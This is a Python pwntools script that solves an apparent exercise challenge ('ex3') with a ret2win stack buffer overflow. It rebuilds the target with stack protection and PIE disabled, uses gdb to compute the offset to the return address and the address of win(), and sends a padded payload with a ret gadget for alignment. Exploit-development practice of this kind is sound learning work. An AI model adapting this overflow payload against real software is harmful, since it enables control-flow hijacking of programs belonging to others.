#!/usr/bin/env python3
# Verbose, robust ret2win for ex3:
# - Break at main, run to it, step past prologue (so $rbp is valid), then compute OFFSET in gdb
# - Insert a single 'ret' gadget before win() for 16-byte stack alignment
from pwn import *
import subprocess, re, os, sys, shlex

context.clear(arch='amd64')
context.log_level = 'info'   # set 'debug' for even more detail

ELF_PATH = './bin/ex3'
SRC_PATH = './ex3.c'
GDB_CMDS  = '/tmp/solve_ex3.gdb.cmd'
GDB_OUT   = '/tmp/solve_ex3.gdb.out'

def run(cmd, timeout=20):
    print(f"[cmd] {cmd}")
    return subprocess.run(cmd, shell=True, text=True,
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          timeout=timeout)

def ensure_build():
    os.makedirs('./bin', exist_ok=True)
    build = (
        f"gcc {shlex.quote(SRC_PATH)} -o {shlex.quote(ELF_PATH)} "
        "-O0 -g3 -ggdb -fno-omit-frame-pointer -fno-stack-protector -no-pie"
    )
    out = run(build)
    print(out.stdout, end="")
    if out.returncode != 0:
        print("[!] Build failed. Make sure gcc is installed and ex3.c exists.")
        sys.exit(1)
    # Show file type for sanity
    info = run(f"file {shlex.quote(ELF_PATH)}")
    print(info.stdout, end="")

def analyse_with_gdb() -> tuple[int, int]:
    """
    Flow:
      - file ./bin/ex3
      - tbreak main; run < /dev/null
      - frame 0
      - nexti 2         (prologue: push rbp; mov rbp,rsp)
      - print &buffer, $rbp+8, win
      - compute OFFSET = (long)($rbp+8) - (long)&buffer
    """
    gdb_script = "\n".join([
        "set pagination off",
        "set confirm off",
        "set disassemble-next-line on",
        f"file {ELF_PATH}",
        'echo [gdb] ensure symbol: main\\n',
        "info address main",
        'echo [gdb] tbreak main; run to function entry (avoid hitting gets)\\n',
        "tbreak main",
        "run < /dev/null",
        "echo [gdb] select frame 0\\n",
        "frame 0",
        'echo [gdb] step past prologue so $rbp is valid\\n',
        "nexti 2",
        'echo [gdb] printing locals/addresses...\\n',
        'printf "[VAL] &buffer = %p\\n", &buffer',
        'printf "[VAL] RETslot = %p\\n", $rbp+8',
        'printf "[VAL] win    = %p\\n", win',
        'printf "[VAL] OFFSET = %ld\\n", ((long)($rbp+8) - (long)&buffer)',
        "echo [gdb] top frame info (sanity)\\n",
        "info frame",
        "quit"
    ])
    with open(GDB_CMDS, 'w') as f:
        f.write(gdb_script + "\n")

    print("[*] Launching gdb (foreground) to compute OFFSET and win()...")
    out = run(f"gdb -q -batch -x {GDB_CMDS}", timeout=15)
    print("-----[ gdb output ]-----")
    print(out.stdout, end="")
    print("-----[ end gdb output ]-----")
    with open(GDB_OUT, 'w') as f:
        f.write(out.stdout)

    # Parse explicit [VAL] lines
    m_buf = re.search(r"\[VAL\]\s*&buffer\s*=\s*(0x[0-9a-fA-F]+)", out.stdout)
    m_ret = re.search(r"\[VAL\]\s*RETslot\s*=\s*(0x[0-9a-fA-F]+)", out.stdout)
    m_win = re.search(r"\[VAL\]\s*win\s*=\s*(0x[0-9a-fA-F]+)", out.stdout)
    m_off = re.search(r"\[VAL\]\s*OFFSET\s*=\s*(-?\d+)", out.stdout)

    if not (m_buf and m_ret and m_win and m_off):
        print("[!] Failed to parse from gdb. Check", GDB_OUT, "for details.")
        sys.exit(1)

    offset = int(m_off.group(1))
    win_addr = int(m_win.group(1), 16)

    # Sanity
    if offset <= 0 or offset > 4096:
        print(f"[!] Suspicious OFFSET={offset}. This usually means you didn't stop in main.")
        print("[i] Ensure we hit 'tbreak main; run' (not _start), and locals exist (compiled with -O0, frame ptr).")
        sys.exit(1)

    print(f"[ok] OFFSET (buffer → RET) = {offset} bytes")
    print(f"[ok] win()                 = {hex(win_addr)}")
    return offset, win_addr

def main():
    print("[*] Rebuilding ex3 with debug-friendly flags...")
    ensure_build()

    print("[*] Analysing binary with gdb (verbose)...")
    offset, win_addr = analyse_with_gdb()

    elf = ELF(ELF_PATH, checksec=False)
    rop = ROP(elf)
    ret_gadget = rop.find_gadget(['ret']).address
    print(f"[*] Using ret gadget at {hex(ret_gadget)} for 16-byte stack alignment")

    payload = b"A"*offset + p64(ret_gadget) + p64(win_addr)
    print(f"[*] Payload length = {len(payload)} bytes")

    print("[*] Spawning target and sending payload (+ newline so gets() returns)...")
    p = process(ELF_PATH)
    p.sendline(payload)

    try:
        data = p.recv(timeout=1)
        if data:
            print("-----[ program says ]-----")
            print(data.decode(errors='ignore'), end="")
            print("-----[ end program ]-----")
    except EOFError:
        pass


if __name__ == "__main__":
    main()

